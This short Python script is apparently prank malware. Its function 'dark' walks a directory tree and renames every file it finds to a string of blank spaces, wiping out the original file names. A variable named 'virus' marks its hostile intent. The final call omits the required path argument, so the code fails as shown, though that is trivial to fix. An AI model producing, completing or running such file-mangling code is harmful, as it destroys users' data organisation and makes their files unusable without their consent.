import os

def dark(path):
	for dir,dires,files in os.walk(path):
		virus = len(files)
		for o in range(virus):
			ko = dir+"/"+files[o]
			python = " "*(o+1)
			os.rename(ko,dir+"/"+python)
dark()
